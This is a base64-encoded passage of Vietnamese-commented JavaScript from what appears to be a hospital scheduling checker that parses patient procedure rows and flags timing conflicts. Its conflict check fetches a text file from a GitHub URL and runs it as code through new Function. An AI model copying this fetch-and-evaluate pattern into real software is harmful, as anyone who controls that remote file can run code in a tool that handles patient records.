V4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu6cgdGh14bqtdCcpOw0KICAgICAgICAgICAgICAgIGlmIChzdGFydEluZGV4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1IHRo4buxYyBoaeG7h24nKTsNCiAgICAgICAgICAgICAgICBpZiAoZW5kSW5kZXggPT09IC0xKSBtaXNzaW5nQ29sdW1ucy5wdXNoKCdUaOG7nWkgZ2lhbiBr4bq/dCB0aMO6YycpOw0KICAgICAgICAgICAgICAgIGlmIChvcGVyYXRvckluZGV4ID09PSAtMSkgbWlzc2luZ0NvbHVtbnMucHVzaCgnVGjhu6cgdGh14bqtdCBjaMOtbmgnKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBpZiAobWlzc2luZ0NvbHVtbnMubGVuZ3RoID4gMCkgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoYEtow7RuZyB0w6xtIHRo4bqleSBjw6FjIGPhu5l0IGLhuq90IGJ14buZYzogJHttaXNzaW5nQ29sdW1ucy5qb2luKCcsICcpfWApOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBjb25zdCByb3dzID0gZGF0YS5zbGljZSg5KTsNCiAgICAgICAgICAgICAgICBjb25zdCBwcm9jZWR1cmVzID0gW107DQogICAgICAgICAgICAgICAgY29uc3QgaGVyYlByb2NlZHVyZXMgPSBbXTsNCiAgICAgICAgICAgICAgICBsZXQgc2tpcHBlZFJvd3MgPSAwOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHJvd3MuZm9yRWFjaCgocm93LCBpbmRleCkgPT4gew0KICAgICAgICAgICAgICAgICAgICBjb25zdCByb3dOdW1iZXIgPSBpbmRleCArIDEwOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICghcm93IHx8IHJvdy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcignRMOybmcgdHLhu5FuZycsIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IHByb2NlZHVyZU5hbWUgPSByb3dbcHJvY2VkdXJlSW5kZXhdOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXByb2NlZHVyZU5hbWUpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBza2lwcGVkUm93cysrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nRXJyb3IoYFRo4bunIHRodeG6rXQga2jDtG5nIG7hurFtIHRyb25nIGRhbmggc8OhY2gga2nhu4NtIHRyYTogJHtwcm9jZWR1cmVOYW1lfWAsIHJvd051bWJlcik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChQUk9DRURVUkVTW3Byb2NlZHVyZU5hbWVdLnNraXApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBzdGFydCA9IHBhcnNlRGF0ZVRpbWUocm93W3N0YXJ0SW5kZXhdLCByb3dOdW1iZXIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGVuZCA9IHBhcnNlRGF0ZVRpbWUocm93W2VuZEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoZXJiUHJvY2VkdXJlcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm93SW5kZXg6IHJvd051bWJlciwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhdGllbnRJZDogcGF0aWVudElkSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRJZEluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCQkJCQkJCXBhdGllbnRBZ2U6IHBhdGllbnRhZ2VJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudGFnZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdG9yOiByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZTogc3RhcnQ/LmRhdGVLZXkgfHwgJ0tow7RuZyB4w6FjIMSR4buLbmgnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydDogc3RhcnQ/LnNlY29uZHMgfHwgMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kOiBlbmQ/LnNlY29uZHMgfHwgMCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheVN0YXJ0OiBzdGFydD8uZGlzcGxheVRpbWUgfHwgJz8/JywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheUVuZDogZW5kPy5kaXNwbGF5VGltZSB8fCAnPz8nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVyYXRvcjogcm93W29wZXJhdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlSW5mbzogUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3Qgc3RhcnQgPSBwYXJzZURhdGVUaW1lKHJvd1tzdGFydEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGVuZCA9IHBhcnNlRGF0ZVRpbWUocm93W2VuZEluZGV4XSwgcm93TnVtYmVyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFzdGFydCB8fCAhZW5kKSB7DQogICANCiAgICBza2lwcGVkUm93cysrOw0KICAgIHJldHVybjsNCn0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHN0YXJ0LmRhdGVLZXkgIT09IGVuZC5kYXRlS2V5KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9nRXJyb3IoJ1Ro4bunIHRodeG6rXQgYuG6r3QgxJHhuqd1IHbDoCBr4bq/dCB0aMO6YyBraMOhYyBuZ8OgeScsIHJvd051bWJlciwgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydERhdGU6IHN0YXJ0LmRhdGVLZXksDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZERhdGU6IGVuZC5kYXRlS2V5LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJCQkJCQkJcGF0aWVudElkOiBwYXRpZW50SWRJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudElkSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJCQkJCQkJcGF0aWVudEFnZTogcGF0aWVudGFnZUluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50YWdlSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm47DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChlbmQuc2Vjb25kcyA8PSBzdGFydC5zZWNvbmRzKSB7DQogICAgbG9nRXJyb3IoJ1Ro4budaSBnaWFuIGvhur90IHRow7pjIHBo4bqjaSBzYXUgdGjhu51pIGdpYW4gYuG6r3QgxJHhuqd1Jywgcm93TnVtYmVyLCB7DQogICAgICAgIHN0YXJ0VGltZTogc3RhcnQuZGlzcGxheVRpbWUsDQogICAgICAgIGVuZFRpbWU6IGVuZC5kaXNwbGF5VGltZSwNCiAgICAgICAgc3RhcnRWYWx1ZTogcm93W3N0YXJ0SW5kZXhdLA0KICAgICAgICBlbmRWYWx1ZTogcm93W2VuZEluZGV4XSwNCiAgICAgICAgcGF0aWVudE5hbWU6IG5hbWVJbmRleCAhPT0gLTEgPyByb3dbbmFtZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCXBhdGllbnRJZDogcGF0aWVudElkSW5kZXggIT09IC0xID8gcm93W3BhdGllbnRJZEluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQoJCXBhdGllbnRBZ2U6IHBhdGllbnRhZ2VJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudGFnZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgbmdheVRodWNIaWVuOiBkYXRlSW5kZXggIT09IC0xID8gcm93W2RhdGVJbmRleF0gOiAnS2jDtG5nIHjDoWMgxJHhu4tuaCcNCiAgICB9KTsNCiAgICBza2lwcGVkUm93cysrOw0KICAgIHJldHVybjsNCn0NCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgZXhwZWN0ZWREdXJhdGlvbiA9IFBST0NFRFVSRVNbcHJvY2VkdXJlTmFtZV0/LmR1cmF0aW9uIHx8IDA7DQogICAgICAgICAgICAgICAgICAgICAgICBjb25zdCBhY3R1YWxEdXJhdGlvbk1pbnV0ZXMgPSAoZW5kLnNlY29uZHMgLSBzdGFydC5zZWNvbmRzKSAvIDYwOw0KICAgICAgICAgICAgICAgICAgICAgICAgDQpsZXQgZHVyYXRpb25EaWZmID0gTWF0aC5hYnMoYWN0dWFsRHVyYXRpb25NaW51dGVzIC0gZXhwZWN0ZWREdXJhdGlvbik7DQpsZXQgaXNEb2N0b3IgPSAoc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnbWVkVXNlcicpIHx8ICcnKS50b0xvd2VyQ2FzZSgpID09PSAnZG9jdG9yJzsNCg0KaWYgKA0KICAgIGV4cGVjdGVkRHVyYXRpb24gPiAwICYmDQogICAgKA0KICAgICAgICAoaXNEb2N0b3IgJiYgZHVyYXRpb25EaWZmID49IDEpIHx8ICAgLy8g4pyUIHTDoGkga2hv4bqjbiBkb2N0b3INCiAgICAgICAgKCFpc0RvY3RvciAmJiBkdXJhdGlvbkRpZmYgPiAxKSAgICAgIC8vIOKclCB0w6BpIGtob+G6o24ga2jDoWMNCiAgICApDQopIHsNCiAgICBsb2dFcnJvcihgYCwgcm93TnVtYmVyLCB7DQogICAgICAgIHByb2NlZHVyZTogcHJvY2VkdXJlTmFtZSwNCiAgICAgICAgZXhwZWN0ZWQ6IGV4cGVjdGVkRHVyYXRpb24sDQogICAgICAgIGFjdHVhbDogYWN0dWFsRHVyYXRpb25NaW51dGVzLA0KICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJcGF0aWVudElkOiBwYXRpZW50SWRJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudElkSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCgkJcGF0aWVudEFnZTogcGF0aWVudGFnZUluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50YWdlSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgb3BlcmF0b3I6IHJvd1tvcGVyYXRvckluZGV4XSA/IHJvd1tvcGVyYXRvckluZGV4XS5yZXBsYWNlKC8sL2csICcnKSA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgZGF0ZTogc3RhcnQuZGF0ZUtleSwNCiAgICAgICAgbmdheVRodWNIaWVuOiBkYXRlSW5kZXggIT09IC0xID8gcm93W2RhdGVJbmRleF0gOiAnS2jDtG5nIHjDoWMgxJHhu4tuaCcsDQogICAgICAgIHN0YXJ0VGltZTogc3RhcnQuZGlzcGxheVRpbWUsDQogICAgICAgIGVuZFRpbWU6IGVuZC5kaXNwbGF5VGltZSwNCiAgICAgICAgZG9jdG9yOiByb3dbZG9jdG9ySW5kZXhdIHx8ICdLaMO0bmcgY8OzJyAvLyBUaMOqbSBkw7JuZyBuw6B5DQogICAgfSk7DQp9DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHByb2NlZHVyZU5hbWUgPT09ICdT4bqvYyB0aHXhu5FjIHRoYW5nJykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhlcmJQcm9jZWR1cmVzLnB1c2gocHJvY2VkdXJlc1twcm9jZWR1cmVzLmxlbmd0aCAtIDFdKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIHByb2NlZHVyZXMucHVzaCh7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcm93SW5kZXg6IHJvd051bWJlciwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50SWQ6IHBhdGllbnRJZEluZGV4ICE9PSAtMSA/IHJvd1twYXRpZW50SWRJbmRleF0gfHwgJ0tow7RuZyBjw7MnIDogJ0tow7RuZyBjw7MnLA0KCQkJCQkJCXBhdGllbnRBZ2U6IHBhdGllbnRhZ2VJbmRleCAhPT0gLTEgPyByb3dbcGF0aWVudGFnZUluZGV4XSB8fCAnS2jDtG5nIGPDsycgOiAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlOiBwcm9jZWR1cmVOYW1lLA0KCQkJCQkJCWRvY3Rvcjogcm93W2RvY3RvckluZGV4XSB8fCAnS2jDtG5nIGPDsycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZTogc3RhcnQuZGF0ZUtleSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGFydDogc3RhcnQuc2Vjb25kcywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQ6IGVuZC5zZWNvbmRzLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlTdGFydDogc3RhcnQuZGlzcGxheVRpbWUsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGlzcGxheUVuZDogZW5kLmRpc3BsYXlUaW1lLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9wZXJhdG9yOiByb3dbb3BlcmF0b3JJbmRleF0gfHwgJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbmZsaWN0OiBmYWxzZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb25mbGljdFJlYXNvbjogJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJvY2VkdXJlSW5mbzogUFJPQ0VEVVJFU1twcm9jZWR1cmVOYW1lXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdWdnZXN0aW9uOiAnJw0KICAgICAgICAgICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBsb2dFcnJvcihgTOG7l2kgeOG7rSBsw70gZMOybmc6ICR7ZXJyb3IubWVzc2FnZX1gLCByb3dOdW1iZXIsIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRpZW50TmFtZTogbmFtZUluZGV4ICE9PSAtMSA/IHJvd1tuYW1lSW5kZXhdIHx8ICdLaMO0bmcgY8OzJyA6ICdLaMO0bmcgY8OzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcm9jZWR1cmU6IHJvd1twcm9jZWR1cmVJbmRleF0gfHwgJ0tow7RuZyBjw7MnLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yRGV0YWlsczogZXJyb3Iuc3RhY2sNCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgICAgICAgICAgc2tpcHBlZFJvd3MrKzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmIChwcm9jZWR1cmVzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0tow7RuZyBjw7MgdGjhu6cgdGh14bqtdCBuw6BvIGjhu6NwIGzhu4cgxJHhu4Mga2nhu4NtIHRyYS4gVnVpIGzDsm5nIGtp4buDbSB0cmEgbOG6oWkgZOG7ryBsaeG7h3UuJyk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGNoZWNrQ29uZmxpY3RzKHByb2NlZHVyZXMpOw0KICAgICAgICAgICAgICAgIGdlbmVyYXRlVGltZVN1Z2dlc3Rpb25zKHByb2NlZHVyZXMpOw0KCQkJCSAvLyA9PT0gVEjDik0gMyBEw5JORyBDaGVjayBtw6MgbcOheSA9PT0NCiAgICAgICAgY2hlY2tNYWNoaW5lRXJyb3JzKHByb2NlZHVyZXMsIGRhdGEpOw0KICAgICAgICBjaGVja01hY2hpbmVDb25mbGljdHMocHJvY2VkdXJlcywgZGF0YSk7DQoJCWNoZWNrTWlzc2luZ01hY2hpbmVDb2Rlcyhwcm9jZWR1cmVzLCBkYXRhKTsgDQoJCWNoZWNrRGF0ZU1pc21hdGNoKHByb2NlZHVyZXMsIGRhdGEpOw0KICAgICAgICAvLyA9PT0gS+G6vlQgVEjDmkMgVEjDik0gPT09DQogICAgICAgICAgICAgICAgZGlzcGxheVJlc3VsdHMocHJvY2VkdXJlcywgc2tpcHBlZFJvd3MpOw0KICAgICAgICAgICAgICAgIHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyA9IGhlcmJQcm9jZWR1cmVzOw0KCQkJCS8vIC0tLSBD4bqtcCBuaOG6rXQgc+G7kSBjYSBraMOhYyDEkWEgc+G7kSB0csOqbiBuw7p0IC0tLQ0Kc2V0VGltZW91dCgoKSA9PiB7DQogIGlmICh0eXBlb2YgdXBkYXRlSGVyYkJ1dHRvbldpdGhPdXRsaWVyQ291bnQgPT09ICdmdW5jdGlvbicpIHsNCiAgICB1cGRhdGVIZXJiQnV0dG9uV2l0aE91dGxpZXJDb3VudCgpOw0KICB9DQp9LCAxMDApOw0KDQogICAgICAgICAgICAgICAgZGlzcGxheUVycm9ycygpOw0KCQkJCSANCiAgICAgICAgLy8gPT09IFRIw4pNIDMgRMOSTkcgY2hlY2sgbcOjIG3DoXkgPT09DQogICAgICAgIGRpc3BsYXlNYWNoaW5lRXJyb3JzKCk7DQogICAgICAgIGRpc3BsYXlNYWNoaW5lQ29uZmxpY3RzKCk7DQoJCWRpc3BsYXlNaXNzaW5nTWFjaGluZUVycm9ycygpOw0KCQlkaXNwbGF5RGF0ZU1pc21hdGNoRXJyb3JzKCk7DQogICAgICAgIC8vID09PSBL4bq+VCBUSMOaQyBUSMOKTSA9PT0NCiAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7DQogICAgICAgICAgICAgICAgbG9nRXJyb3IoZXJyb3IubWVzc2FnZSwgbnVsbCwgZXJyb3Iuc3RhY2spOw0KICAgICAgICAgICAgICAgIGRpc3BsYXlFcnJvcnMoKTsNCiAgICAgICAgICAgICAgICBhbGVydCgnQ8OzIGzhu5dpIHjhuqN5IHJhIGtoaSB44butIGzDvSBk4buvIGxp4buHdTogJyArIGVycm9yLm1lc3NhZ2UpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCg0KbGV0IGNvbmZsaWN0UnVsZXNUZXh0ID0gJyc7DQoNCmFzeW5jIGZ1bmN0aW9uIGxvYWRDb25mbGljdFJ1bGVzKCkgew0KICAgIHRyeSB7DQogICAgICAgIGNvbnN0IHVybCA9ICdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vY2hhdWh1eW5oMDEwNC9jaGF1aHV5bmgwMTA0LnR4dC9yZWZzL2hlYWRzL21haW4vY2hhdV94bHRodXRodWF0LnR4dD90cz0nICsgRGF0ZS5ub3coKTsNCiAgICAgICAgY29uc3QgcmVzID0gYXdhaXQgZmV0Y2godXJsKTsNCiAgICAgICAgaWYgKCFyZXMub2spIHRocm93IG5ldyBFcnJvcignS2jDtG5nIHThuqNpIMSRxrDhu6NjIGNoYXVfeGx0aHV0aHVhdC50eHQnKTsNCiAgICAgICAgY29uZmxpY3RSdWxlc1RleHQgPSAoYXdhaXQgcmVzLnRleHQoKSkudHJpbSgpOw0KICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgICAgY29uc29sZS5lcnJvcignTOG7l2kgdOG6o2kgY2hhdV94bHRodXRodWF0LnR4dDonLCBlKTsNCiAgICAgICAgY29uZmxpY3RSdWxlc1RleHQgPSAnJzsgLy8gZmFsbGJhY2s6IHLhu5duZyAtPiBjb2kgbmjGsCBraMO0bmcgY8OzIG5nb+G6oWkgbOG7hw0KICAgIH0NCn0NCg0KDQoNCg0KICAgICAgICBmdW5jdGlvbiBjaGVja0NvbmZsaWN0cyhwcm9jZWR1cmVzKSB7DQogICAgICAgICAgICBjb25zdCBpZ25vcmVBZGphY2VudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpZ25vcmVBZGphY2VudENoZWNrYm94JykuY2hlY2tlZDsNCiAgICAgICAgICAgIGNvbnN0IGdyb3VwcyA9IHt9Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICBwcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgICAgICAgICAgY29uc3Qga2V5ID0gYCR7cHJvYy5vcGVyYXRvcn1fJHtwcm9jLmRhdGV9YDsNCiAgICAgICAgICAgICAgICBpZiAoIWdyb3Vwc1trZXldKSB7DQogICAgICAgICAgICAgICAgICAgIGdyb3Vwc1trZXldID0gW107DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGdyb3Vwc1trZXldLnB1c2gocHJvYyk7DQogICAgICAgICAgICB9KTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgT2JqZWN0LnZhbHVlcyhncm91cHMpLmZvckVhY2goZ3JvdXAgPT4gew0KICAgICAgICAgICAgICAgIGdyb3VwLnNvcnQoKGEsIGIpID0+IGEuc3RhcnQgLSBiLnN0YXJ0KTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMTsgaSA8IGdyb3VwLmxlbmd0aDsgaSsrKSB7DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IHByZXYgPSBncm91cFtpIC0gMV07DQogICAgICAgICAgICAgICAgICAgIGNvbnN0IGN1cnJlbnQgPSBncm91cFtpXTsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgcHJldkVuZFdpdGhCdWZmZXIgPSBwcmV2LmVuZCArIChwcmV2LnByb2NlZHVyZUluZm8/LmJ1ZmZlciB8fCAwKSAqIDYwOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgY29uc3QgaXNBZGphY2VudCA9IGlnbm9yZUFkamFjZW50ICYmIGN1cnJlbnQuc3RhcnQgPT09IHByZXYuZW5kOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgaWYgKGN1cnJlbnQuc3RhcnQgPCBwcmV2RW5kV2l0aEJ1ZmZlciAmJiAhaXNBZGphY2VudCkgew0KICAgICAgICAgICAgICAgICANCg0KbGV0IGlzQ29uZmxpY3QgPSB0cnVlOw0KICAgIHRyeSB7DQogICAgICAgIGlmIChjb25mbGljdFJ1bGVzVGV4dCAmJiBjb25mbGljdFJ1bGVzVGV4dC50cmltKCkpIHsNCiAgICAgICAgICAgIGNvbnN0IGNvbmZsaWN0Q29uZGl0aW9uID0gbmV3IEZ1bmN0aW9uKCdwcmV2JywnY3VycmVudCcsJ3JldHVybiAnICsgY29uZmxpY3RSdWxlc1RleHQudHJpbSgpKTsNCiAgICAgICAgICAgIC8vIGNvbmZsaWN0Q29uZGl0aW9uKCkgVFLhuqIgVuG7gCB0cnVlIG7hur91ICrEkcaw4bujYyBtaeG7hW4geHVuZyDEkeG7mXQqDQogICAgICAgICAgICBjb25zdCBhbGxvd2VkID0gY29uZmxpY3RDb25kaXRpb24ocHJldiwgY3VycmVudCk7DQogICAgICAgICAgICBpc0NvbmZsaWN0ID0gIWFsbG93ZWQ7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpc0NvbmZsaWN0ID0gdHJ1ZTsgLy8ga2jDtG5nIGPDsyBydWxlIC0+IGPhu6kgYsOhbyB4dW5nIMSR4buZdA0KICAgICAgICB9DQogICAgfSBjYXRjaCAoZXJyKSB7DQogICAgICAgIGNvbnNvbGUuZXJyb3IoJ0zhu5dpIGtoaSDEkcOhbmggZ2nDoSB4dW5nIMSR4buZdCB0aOG7nWkgZ2lhbjonLCBlcnIpOw0KICAgICAgICBpc0NvbmZsaWN0ID0gdHJ1ZTsNCiAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpc0NvbmZsaWN0KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3VycmVudC5jb25mbGljdCA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3VycmVudC5jb25mbGljdFJlYXNvbiA9IGAke3ByZXYucHJvY2VkdXJlfTxicj7igKIgQuG7h25oIG5ow6JuOiAke3ByZXYucGF0aWVudE5hbWV9PGJyPuKAoiBOZ8OgeTogJHtwcmV2LmRhdGV9PGJyPuKAoiBUaOG7nWkgZ2lhbjogJHtwcmV2LmRpc3BsYXlTdGFydH0tJHtwcmV2LmRpc3BsYXlFbmR9YDsNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByZXYuY29uZmxpY3QgPSB0cnVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICghcHJldi5jb25mbGljdFJlYXNvbi5pbmNsdWRlcyhjdXJyZW50LnByb2NlZHVyZSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJldi5jb25mbGljdFJlYXNvbiArPSAocHJldi5jb25mbGljdFJlYXNvbiA/ICc8YnI+PGJyPicgOiAnJykgKyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGAgJHtjdXJyZW50LnByb2NlZHVyZX08YnI+4oCiIELhu4duaCBuaMOibjogJHtjdXJyZW50LnBhdGllbnROYW1lfTxicj7igKIgTmfDoHk6ICR7Y3VycmVudC5kYXRlfTxicj7igKIgVGjhu51pIGdpYW46ICR7Y3VycmVudC5kaXNwbGF5U3RhcnR9LSR7Y3VycmVudC5kaXNwbGF5RW5kfWA7DQogICAgICAgI